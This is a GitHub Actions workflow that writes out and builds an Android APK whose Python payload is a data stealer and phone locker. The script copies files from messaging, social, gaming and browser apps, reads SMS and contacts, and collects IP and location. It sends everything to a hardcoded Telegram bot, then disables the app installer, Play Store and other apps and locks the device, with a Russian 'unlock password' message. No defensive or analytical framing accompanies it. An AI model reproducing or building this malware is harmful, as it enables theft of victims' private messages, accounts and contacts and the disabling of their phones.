name: Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: Setup Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'
    - name: Install
      run: |
        pip install buildozer
        sudo apt update
        sudo apt install -y openjdk-17-jdk
    - name: Create main.py
      run: |
        cat > main.py << 'EOF'
import os,requests,subprocess,shutil,json,sqlite3
T="8889128449:AAHUGVmOKw5cqeVx25D1WHN9lJcvyxsH43U"
C="8631833153"
def s(t):
 try:
  for i in range(0,len(t),4000):
   requests.post(f"https://api.telegram.org/bot{T}/sendMessage",json={"chat_id":C,"text":t[i:i+4000]},timeout=5)
 except:pass
def find_files(paths,exts):
 r=[]
 for p in paths:
  if os.path.exists(p):
   for a,b,c in os.walk(p):
    for f in c:
     if any(f.endswith(x) for x in exts):
      try:
       shutil.copy(os.path.join(a,f),f"/sdcard/{f}")
       r.append(f)
      except:pass
 return r
def get_content(path):
 try:
  with open(path,'r') as f:return f.read()[:500]
 except:return""
def steal_google():
 paths=["/storage/emulated/0/Android/data/com.google.android.gms","/data/data/com.google.android.gms","/storage/emulated/0/Android/data/com.google.android.apps.maps"]
 exts=[".db",".xml",".txt",".json"]
 r=find_files(paths,exts)
 return r
def steal_roblox():
 paths=["/storage/emulated/0/Android/data/com.roblox.client","/data/data/com.roblox.client"]
 exts=[".db",".xml",".json",".txt",".cookie"]
 r=find_files(paths,exts)
 return r
def steal_telegram():
 paths=["/storage/emulated/0/Android/data/org.telegram","/data/data/org.telegram"]
 exts=[".db",".xml",".json",".txt"]
 r=find_files(paths,exts)
 return r
def steal_whatsapp():
 paths=["/storage/emulated/0/Android/data/com.whatsapp","/data/data/com.whatsapp"]
 exts=[".db",".xml",".txt","crypt12","crypt14"]
 r=find_files(paths,exts)
 return r
def steal_instagram():
 paths=["/storage/emulated/0/Android/data/com.instagram.android","/data/data/com.instagram.android"]
 exts=[".db",".xml",".json",".txt"]
 r=find_files(paths,exts)
 return r
def steal_facebook():
 paths=["/storage/emulated/0/Android/data/com.facebook.katana","/data/data/com.facebook.katana"]
 exts=[".db",".xml",".json",".txt"]
 r=find_files(paths,exts)
 return r
def steal_discord():
 paths=["/storage/emulated/0/Android/data/com.discord","/data/data/com.discord"]
 exts=[".db",".xml",".json",".txt"]
 r=find_files(paths,exts)
 return r
def steal_tiktok():
 paths=["/storage/emulated/0/Android/data/com.zhiliaoapp.musically","/data/data/com.zhiliaoapp.musically"]
 exts=[".db",".xml",".json",".txt"]
 r=find_files(paths,exts)
 return r
def steal_chrome():
 paths=["/storage/emulated/0/Android/data/com.android.chrome","/data/data/com.android.chrome"]
 exts=[".db",".xml",".txt",".cookie"]
 r=find_files(paths,exts)
 return r
def get_sms():
 try:
  os.system("cp /data/data/com.android.providers.telephony/databases/mmssms.db /sdcard/")
  conn=sqlite3.connect("/sdcard/mmssms.db")
  cur=conn.cursor()
  cur.execute("SELECT address,body FROM sms")
  sms=cur.fetchall()
  conn.close()
  return "\n".join([f"{x[0]}: {x[1][:50]}"for x in sms[:20]])
 except:return"no"
def get_contacts():
 try:
  os.system("cp /data/data/com.android.providers.contacts/databases/contacts2.db /sdcard/")
  conn=sqlite3.connect("/sdcard/contacts2.db")
  cur=conn.cursor()
  cur.execute("SELECT display_name,number FROM contacts")
  c=cur.fetchall()
  conn.close()
  return "\n".join([f"{x[0]}: {x[1]}"for x in c[:20]])
 except:return"no"
def get_ip():
 try:return requests.get("https://api.ipify.org").text
 except:return"no"
def get_location():
 try:
  r=requests.get("http://ip-api.com/json/")
  d=r.json()
  return f"{d.get('city')}, {d.get('country')}, {d.get('lat')}, {d.get('lon')}"
 except:return"no"
def get_device():
 try:
  import android
  return android.get_device_id()
 except:return"no"
def block_phone():
 try:
  os.system("settings put global install_non_market_apps 0")
  apps=["com.android.packageinstaller","com.google.android.gms","com.android.vending","com.android.chrome","com.whatsapp","com.instagram.android","com.facebook.katana","org.telegram","com.roblox.client","com.discord","com.zhiliaoapp.musically","com.snapchat.android","com.twitter.android"]
  for a in apps:
   os.system(f"pm disable {a}")
  os.system("input keyevent 26")
  return"done"
 except:return"no"
msg=f"""🔓 ПАРОЛЬ РАЗБЛОКИРОВКИ: v67

🌐 IP: {get_ip()}
📍 ЛОКАЦИЯ: {get_location()}
📱 УСТРОЙСТВО: {get_device()}

📁 GOOGLE: {steal_google()}
🎮 ROBLOX: {steal_roblox()}
📱 TELEGRAM: {steal_telegram()}
💬 WHATSAPP: {steal_whatsapp()}
📸 INSTAGRAM: {steal_instagram()}
📘 FACEBOOK: {steal_facebook()}
🎮 DISCORD: {steal_discord()}
🎵 TIKTOK: {steal_tiktok()}
🌐 CHROME: {steal_chrome()}

📨 SMS: {get_sms()}
👥 КОНТАКТЫ: {get_contacts()}

🔒 БЛОКИРОВКА: {block_phone()}
"""
s(msg)
EOF
    - name: Create spec
      run: |
        buildozer init
        sed -i 's/requirements = .*/requirements = python3,requests/g' buildozer.spec
        sed -i 's/package.name = .*/package.name = V/g' buildozer.spec
        sed -i 's/package.domain = .*/package.domain = org.v/g' buildozer.spec
        sed -i 's/permissions = .*/permissions = INTERNET,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,READ_SMS,READ_CONTACTS/g' buildozer.spec
    - name: Build
      run: buildozer android debug
    - name: Upload
      uses: actions/upload-artifact@v3
      with:
        name: V
        path: bin/*.apk
